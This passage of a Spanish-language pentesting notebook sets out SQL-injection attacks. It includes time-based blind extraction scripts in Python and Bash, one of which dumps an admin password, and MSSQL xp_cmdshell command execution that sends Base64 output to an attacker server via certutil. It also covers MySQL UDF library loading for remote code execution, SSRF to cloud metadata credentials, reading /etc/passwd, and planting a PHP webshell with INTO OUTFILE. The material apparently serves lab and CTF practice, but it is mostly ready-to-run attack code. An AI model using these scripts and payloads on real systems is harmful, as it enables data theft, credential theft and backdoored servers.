payload = "' or if(substr((select username from users where id='%d'),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)
p2.status("%s" % payload)

if check(payload):
result += c
p1.status("%s" % result)
# si ha encontrado una coincidencia resetea el contador de caracteres en blanco para permitir espacios entre las palabras que formen el nombre
cont = 0
break

# si ha llegado a recorrer todos los caracteres significa que no ha encontrado ninguna coincidencia, se suma 1 a caracteres en blanco
cont += 1

p1.success("%s" % result)
result = ''
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


sqli_db_field_id.sh <campo> <tabla> [longitud_máxima_del_campo]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

# DEFINICION DE COLORES PARA USAR EN SCRIPTS DE BASH
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURAR Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} Se ha producido uno de los siguientes ERRORES:"
echo -e "\t- No se ha proporcionado el nombre de la tabla a enumerar (como argumento 1)"
echo -e "\t- No se ha proporcionado el nombre del campo a enumerar (como argumento 2)"
echo -e "\t- Se han proporcionado más argumentos de los esperados (máximo 3)\n"
echo -e "${white}[${def}-${white}]${def} USO:\n\t${white}$0 ${yellow} <nombre_de_campo> <nombre_de_tabla> ${grey}[longitud_del_campo]${def}"
echo -e "\t${grey}$0 username Users 20${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} RECUERDA:\n\tLos ${white}nombres${def} de las ${white}tablas${def} son ${white}CASE SENSITIVE${def}"
echo -e "\tProbar con la primera letra en mayúscula y el resto en minúscula"
exit 0
}

if [[ "$#" -lt "2" ]]
then
usage
fi

if [[ "$#" -gt "3" ]]
then
usage
fi

tput civis

# ADAPTAR ESTOS VALORES
host='192.168.102.52'
fieldname=$1 # pasar el nombre del campo a enumerar como argumento 1
tablename=$2 # pasar el nombre de la tabla a enumerar como argumento 2
resultlimit=100
charlimit=100

# corrección del límite de caracteres en función de si se ha proporcionado uno como argumento 3
if [[ "$#" -eq "3" ]]
then
charlimit=$3
fi

# variable que almacena los caracteres que se probaran
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable para almacenar los resultados
result=""
whitechar=0
whiteresult=0

echo -e "\n${white}[${green}*${white}] --- Enumerando campo ${yellow}$fieldname${def} de la tabla ${yellow}$tablename ${white}en base a ID --- [${green}*${white}]${def}\n"
for (( t=0; t <= $resultlimit; t++)) # limite de RESULTADOS a obtener
do
if [[ "whiteresult" -ge "2" ]]
then
echo -e "[${yellow}¡${def}] Segundo ID en blanco"
echo -e "[${green}*${def}] Fin de enumeración del campo $fieldname en la tabla $tablename"
tput cnorm
exit 0
fi
echo -e "${white}Enumerando ID ${cian}$t${white} del campo $fieldname${def}\n"
for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
echo -e "  Fin de la enumeración del ID $t del campo $fieldname\n"
echo -e "  ${white}Valor del campo $fieldname para ID $t: ${green}$result${def}\n\n"
chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whiteresult=$((whiteresult + 1))
fi
break
fi

# bucle anidado que recorre cada uno de los caracteres almacenados en la variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select $fieldname from $tablename where id=$t),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -ge 1 ]]
then
if [[ "$whitechar" -eq 1 ]] # corrección de escritura si el primer caracter estaba en blanco pero los demás no
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  Se ha alcanzado el límite de $charlimit caracteres por campo."
echo -e "\n  ${yellow}Valor del campo $fieldname para ID $t: ${green}$result${def}\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}] Fin de enumeración del campo $fieldname en la tabla $tablename"
tput cnorm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Señalar que en este caso se pone la sentencia entre paréntesis, para que no de errores en la ejecución.
Se añade un contador de espacios en blanco (para aligerar la búsqueda).
En el primer caracter que no encuentre coincidencia continuará, para permitir nombres compuestos, con dos o más palabras
La segunda vez, consecutiva, que no encuentra coincidencia, entiende que son 2 espacios en blanco seguidos y entiende que ha finalizado la búsqueda.


Averiguar Valor de Campo Conocido de Usuario Conocido en Columna Conocida de Tabla Conocida
La consulta sería: substr((select password from users where username='admin'),%d,1)='%c',sleep(5),1)-- -
Donde:
columnaPassword → es el nombre de la columna que contiene las passwords
tablaUsers → es el nombre de la tabla que contiene la columna con las passwords
usuarioConocido → es el nombre del usuario que se conoce, del cual se quiere obtener la password
%d → será la posición del caracter que se está comprobando
%c → será la posición en el array de caracteres a probar del caracter que se comprueba
5 → será el número de segundos de espera antes de proseguir con la ejecución (si lo espera es que coincide)
sqli_pwner.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

# variable para almacenar el tiempo de espera de las consultas
sleep = 0

# establece el timpo de espera para validar consulta en 5 si no se ha pasado argumento o en el valor que se haya pasado como argumento
if len(sys.argv) == 1:
sleep = 5
else:
sleep = int(sys.argv[1])

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyz0123456789.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > sleep:
return 1

p1 = log.progress("Password")
p2 = log.progress("Payload")

# variable para controlar los espacios en blanco
cont = 0

for i in xrange(1, 40):
# Si ha sumado mas de 2 veces sin encontrar un caracter, se entiende que son caracteres en blanco, se da por finalizada la búsqueda para esa columna
if ( cont > 2 ):
print("[!] tres caracters en blanco seguidos. Pasamos a la siguiente iteración")
break

for c in s:
payload = "' or if(substr((select password from users where username='admin'),%d,1)='%c',sleep(%d),1)-- -" % (i,c,sleep)
p2.status("%s" % payload)

if check(payload):
result += c
p1.status("%s" % result)
# si ha encontrado una coincidencia resetea el contador de caracteres en blanco para permitir espacios entre las palabras que formen el nombre
cont = 0
break

# si ha llegado a recorrer todos los caracteres significa que no ha encontrado ninguna coincidencia, se suma 1 a caracteres en blanco
cont = cont + 1

p1.success("%s" % result)
result = ''
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


sqli_db_field_value.sh <tabla> <campo_conocido> <valor_campo_conocido> <campo_del_que_obtener_el_valor> [longitud_máxima_del_campo]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

# DEFINICION DE COLORES PARA USAR EN SCRIPTS DE BASH
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURAR Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} Se ha producido uno de los siguientes ERRORES:"
echo -e "\t- No se ha proporcionado el nombre de la tabla (como argumento 1)"
echo -e "\t- No se ha proporcionado el nombre del campo a usar como referencia (como argumento 2)"
echo -e "\t- No se ha proporcionado el valor que debe contener el campo de referencia (como argumento 3)"
echo -e "\t- No se ha proporcionado el nombre del campo del que se desea obtener el valor (como argumento 4)"
echo -e "\t- Se han proporcionado más argumentos de los esperados (máximo 5)\n"
echo -e "${white}[${def}-${white}]${def} USO:\n\t${white}$0 ${yellow} <nombre_de_tabla> <campo_de_referencia> <valor_del_campo_de_referencia> <campo_del_que_obtener_el_valor> ${grey}[longitud_del_campo]${def}"
echo -e "\t${grey}$0 Users username admin password 40${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} RECUERDA:\n\tLos ${white}nombres${def} de las ${white}tablas${def} son ${white}CASE SENSITIVE${def}"
echo -e "\tProbar con la primera letra en mayúscula y el resto en minúscula"
exit 0
}

if [[ "$#" -lt "4" ]]
then
usage
fi

if [[ "$#" -gt "5" ]]
then
usage
fi

tput civis

tablename=$1    # pasar el nombre de la tabla a enumerar como argumento 1
fieldname=$2    # pasar el nombre del campo que es usará como referencia como argumento 2
fielvalue=$3    # pasar el valor que debe contener el campo de referencia como argumento 3
field=$4        # pasar el nombre del campo del cual se quiere obtener el valor 4
charlimit=100

# ADAPTAR ESTOS VALORES
host='192.168.102.52'

# corrección del límite de caracteres en función de si se ha proporcionado uno como argumento 5
if [[ "$#" -eq "5" ]]
then
charlimit=$5
fi

# variable que almacena los caracteres que se probaran
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable para almacenar los resultados
result=""
whitechar=0

echo -e "\n${white}[${green}*${white}] --- Enumerando valor del campo \"${yellow}$field${white}\" de la tabla \"${yellow}$tablename${white}\" en base al valor \"${yellow}$fielvalue${white}\" del campo \"${yellow}$fieldname${white}\" de la misma tabla --- [${green}*${white}]${def}\n"

for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
break
fi

# bucle anidado que recorre cada uno de los caracteres almacenados en la variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( \
SELECT( \
if( 
substr( \
(select $field from $tablename where $fieldname='$fielvalue'),$i,1)='${char:$k:1}', sleep(5), 1 \
) \
) \
)OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -ge 1 ]]
then
if [[ "$whitechar" -eq 1 ]] # corrección de escritura si el primer caracter estaba en blanco pero los demás no
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done

echo -e "  ${white}Valor del campo $field para el valor $fielvalue del campo $fieldname en la tabla $tablename: ${green}$result${def}\n"
echo -e "  Fin de la enumeración."
tput cnorm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Señalar que en este caso se pone la sentencia entre paréntesis, para que no de errores en la ejecución.
Se introduce condicional para aceptar como argumento un valor para el tiempo del sleep
Se añade un contador de espacios en blanco (para aligerar la búsqueda).
En el primer caracter que no encuentre coincidencia continuará, para permitir nombres compuestos, con dos o más palabras
La segunda vez, consecutiva, que no encuentra coincidencia, entiende que son 2 espacios en blanco seguidos y entiende que ha finalizado la búsqueda.


Ejecución Remota de Comandos (RCE) con SQLI

XP_CMDSHELL
En MSSQL existe el proceso llamado xp_cmdshell. Este proceso recibe un comando de windows, lo ejecuta  y devuelve el resultado como lineas de texto.
Por defecto está deshabilitado.

Habilitar xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

ACE con xp_cmdshell
Para verificar si tenemos capacidad para ejecutar comandos vía xp_cmdshell utilizamos "certutil". Este comando realizará una petición 'GET' a la $ip indicada

';EXEC xp_cmdshell 'certutil -urlcache -f http://$ip';--
Donde:				
"';" y ";--"	→ forman parte de la petición que permite la SQLi
$ip 				→ es la ip de la máquina atacante donde un servidor HTTP estará esperando la petición, si la recibe es que tenemos capacidad de ejecución

RCE con xp_cmdshell
Con xp_cmdshell, dado que la inyección no ocurre en la consulta origina no podremos ver la salida del comando.
Si tenemos capacidad de ejecutar "certutil" podemos exfiltrar datos utilizando este comando para enviar peticiones GET a nuestro servido r que contengan estos datos.
Los datos son codificados en Base64 ya que permite transferir más información en menos caracteres.

Proceso
1.- Declarar una variable de tipo "table" para almacenar la salida de los comandos ejecutados mediante el proceso xp_cmdshell
declare @r varchar(4120),@cmdOutput varchar(4120);
declare @res TABLE(line varchar(max));
2.- Dumpear la salida de los comandos ejecutados a la variable
insert into @res exec xp_cmdshell 'COMMAND';
3.- Concatenar las filas de la tabla separándolas con "line break"
Si no disponemos de la función group_concat, podemos utilizar 'FOR XML' para concatenar las filas en una sola cadena en formato XML
Utilizamos una cadena vacía como 'PATH mode' para eliminar las etiquetas
SELECT column+char(10) as 'text()' FROM table FOR XML path('')
4.- Codificar en Base64 la cadena resultante y almacenarla en una variable
Como no se puede convertir directamente un string en Base64, la solución es convertir previamente la string a datos de tipo binario
SELECT cast('tarlogic' AS varbinary(max)) FOR XML path(''), BINARY BASE64
5.- Utilizar el comando "certutil" para realizar la petición 'GET' añadiéndole la información contenida en la variable.

Ejemplo
declare @r varchar(4120),@cmdOutput varchar(4120);
declare @res TABLE(line varchar(max));
insert into @res exec xp_cmdshell 'COMMAND';
set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);
set @r=concat('certutil -urlcache -f https://redteam/',@cmdOutput);
exec xp_cmdshell @r;

Automatización
Una vez que tenemos la capacidad de ejecutar y visualizar la salida de cualquier comando, procedemos a automatizar el proceso.
El siguiente enlace dispone de una herramienta que ofrece al usuario un mensaje para ingresar un comando.
Luego, genera la carga útil necesaria para ejecutarlo mientras se implementa un servidor web para recibir el resultado. Finalmente, lo decodifica y lo muestra en pantalla.


RCE en MySQL vía UDF (Funciones Definidas Por el Usuario) 

Recursos
https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf
https://osandamalith.com/2018/02/11/mysql-udf-exploitation/
https://dev.mysql.com/doc/refman/5.7/en/create-table.html
https://www.tutorialspoint.com/mysql/mysql-create-tables.htm

Descripción
Consiste en cargar una librería personalizada (con funciones personalizadas) en una tabla de la base de datos, para posteriormente volcarla a la ruta de las librerías para MySQL.
Finálmente se podrán realizar llamadas a las funciones definidas en la librería personalizada mediante la capacidad de SQLi que se tenga.

Según la versión de MySQL (identificar con 'SELECT @@version) el directorio desde donde se pueden cargar los complementos está restringido.
MySQL por debajo de v5.0.67 permite que los archivos de la biblioteca se carguen desde la ruta del sistema, si no se estableció la variable plugin_dir.
Las versiones más nuevas tienen la variable plugin_dir configurada en algo como "/usr/lib/mysql/plugin/", que generalmente es propiedad de root (consultar con 'SELECT @@plugin_dir').

Requisitos
- Que la SQLi la ejecute un usuario con capacidad de INSERT en el la BBDD 'mysql'
- Que la SQLi la ejecute un usuario con capacidad de acceso remoto desde cualquier host
- Capacidad de escribir en la ubicación especificada en @@plugin_dir mediante la SQLi
- file_priv establecido en Y en mysql.user para el usuario de la base de datos
- secure_file_priv establecido en "" para leer los bytes sin procesar desde una ubicación arbitraria, como la red o un directorio de carga de archivos en una aplicación web.

Si se cumplen las condiciones anteriores, puede transferir la biblioteca MySQL UDF lib_mysqludf_sys al servidor de la base de datos.
Luego podrá realizar solicitudes de comandos del sistema operativo como curl o powershell wget para realizar SSRF usando la sintaxis:
x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //

Funciones
sys_exec
sys_eval
http_get

Ejemplo
# curl -X POST "http://$ip/zm/index.php" -d "view=request&request=log&task=query&limit=100;( SELECT * FROM (SELECT(sys_exec('ping -c 2 192.168.49.102')))OQkj)#minTime=1'"


Proceso Completo

1.- Seleccionamos la librería adecuada según el OS y la arquitectura de la máquina víctima:
# ls /usr/share/metasploit-framework/data/exploits/mysql/
lib_mysqludf_sys_32.dll		lib_mysqludf_sys_32.so		lib_mysqludf_sys_64.dll		lib_mysqludf_sys_64.so

2.- Convertimos la librería seleccionada en una Cadena Hexadecimal:
# xxd -p libSelec.ext | tr -d '\n' > libSelecHex.txt

3.- Partimos la cadena hexadecimal en archivos de 256 bytes (esto generara archivo con nombre xaa, xab, xac, ..., xnn de 256 bytes)
# split -b 256 libSelecHex.txt

4.- Para facilitar el proceso siguiente:
a) guardamos el nombre de los archivos creados en una lista:
# ls x* > partes_cadena_hex.txt
b) eliminamos del archivo la primera línea (ya que esa se inserta la primera, por separado del resto):
# sed -i -e "1d" partes_cadena_hex.txt
b) cambiamos el nombre del primer archivo (para facilitar luego el proceso de inserción):
# mv xaa aaa

!!!→	Los siguientes comandos se han de ejecutar como PAYLOAD de la capacidad de SQLi que tengamos.
Para facilitarlo, creamos un script que utiliza el argumento que le pasemos de entrada como PAYLOAD de la request con la que tenemos capacidad de SQLi

5.- Creamos tabla nueva:
# ./script.sh "CREATE TABLE nombreTabla(nombreColumna longblob)"

6.- Insertamos la primera parte de la cadena hexadecimal en la columna creada:
# ./script.sh "INSERT INTO nombreTabla(nombreColumna) VALUES (0x$(cat aaa))"

7.- Concatenamos el resto de partes de la cadena hexadecimal con el valor almacenado en la columna creada
# for file in $(cat partes_cadena_hex.txt); do ./script.sh "UPDATE nombreTabla SET nombreColumna=CONCAT(data,0x$(cat $file))"; done

8.- Volcamos el contenido de la columna creada dentro de un archivo, con extensión adecuada al OS de la vícitma (.dll || .so), en la carpeta de plugins
# ./script.sh "SELECT nombreColumna FROM nombreTabla INTO DUMPFILE '/usr/lib/mysql/plugin/customlib.so'"

9.- Creamos las funciones para ejecución de comandos y para evaluación de comandos:
# ./script.sh "CREATE FUNCTION sys_exec RETURNS int SONAME 'customlib.so'"
# ./script.sh "CREATE FUNCTION sys_eval RETURNS string SONAME 'customlib.so'"

10.- Ejecutamos un ping contra nuestra máquina para verificar que funciona:
# ./script.sh "SELECT sys_exec('ping -c2 $host')"


Puerta Trasera en Servidor Web con SQLi (Inyección SQL)

Petición Legitima SQL utilizada en los ejemplos
select user, password from user where user="admin" and password='123'


Escribir Archivos Arbitrarios
Comando MySQL
mysql> select "text" INTO OUTFILE "file.txt"

Anexado a la Petición Legítima con UNION SQL
select user, password from user where user="admin" and password="123" UNION select "text",2 into outfile "/tmp/file.txt" -- '

Resultado
Se creará el archivo "/tmp/file.txt" incluido el resultado de la consulta


Leer Archivos Arbitrarios
Comando MySQL
mysql> select load_file("PATH_TO_FILE");

Anexado a la Petición Legítima con UNION SQL
select user, password from user where user="admin" and password="123" UNION select load_file("/etc/passwd"), 2-- '


Webshell
Código Simple Webshell
<? system($_REQUEST['cmd']); ?>

Escenario
Ruta con permiso de escritura utilizado en los ejemplos: /var/www/html/temp

Ejecución
1. Encontrar una Inyección SQL (SQLi)
2. Localizar un directorio con permisos de escritura
Opción A:
Directorios temporales utilizados por los CMS. Verificar estas URLs para encontrar uno
• hxxp://www.target.com/templates_compiled/
• hxxp://www.target.com/templates_c/
• hxxp://www.target.com/templates/
• hxxp://www.target.com/temporary/
• hxxp://www.target.com/images/
• hxxp://www.target.com/cache/
• hxxp://www.target.com/temp/
• hxxp://www.target.com/files/
Opción B:
Generar Errores PHP
Causar un fallo de un script php, esto imprimirá la ruta completa junto con el mensaje de error.
Jugar con los parámetros de la página puede hacer que esto suceda.
Buscar archivo que Imprima phpinfo()
Por ejemplo:
◇ hxxp://www.target.com/phpinfo.php
◇ hxxp://www.target.com/test.php
◇ hxxp://www.target.com/info.php
Buscar Ubicación Predeterminada del directorio Web
https://web.archive.org/web/20131205065157/http://wiki.apache.org/httpd/DistrosDefaultLayout	
Leer el Archivo de Configuración de Apache
Usar el comando load_file() para leer el archivo apache2.conf
select user, password from user where user="admin123" and password="123&" UNION select load_file("/etc/apache2/apache2.conf"), 2 -- '

3. Utilizar la SLQi para Crear la Webshell
Agregar la siguiente cadena al comando SQL legítimo:

!!!*** Verifica el número de columnas de esa query (con ' order by 100-- -) para adaptar el valor de ,2,3,4 o eliminarlos si solo es 1
' UNION SELECT ("<?php system($_REQUEST['cmd']); ?>"),2,3,4 INTO OUTFILE '/var/www/html/temp/c.php' -- 1
Donde:
2,3,4 				← Para que la petición tenga el mismo número de columnas que la primera parte de la Petición Legítimo (en este caso se añaden 3 columnas).
/var/www/html	← Directorio Web por defecto de la distribuciones tipo RedHat-like (Fedora, CentOS).
temp 				← Directorio con permisos de escritura.

4. Ejecución de Comandos Shell
Petición tipo: 	hxxp://www.target.com/temp/c.php?cmd=SHELL_COMMAND
Ejemplo:			hxxp://www.target.com/temp/c.php?cmd=id

Volver a Inicio → 

[mysql_info_func]: <https://dev.mysql.com/doc/refman/5.7/en/information-functions.html>
[pentest_mysql_inject]: <https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet>
[hacktricks_mysql_inject]: <https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf>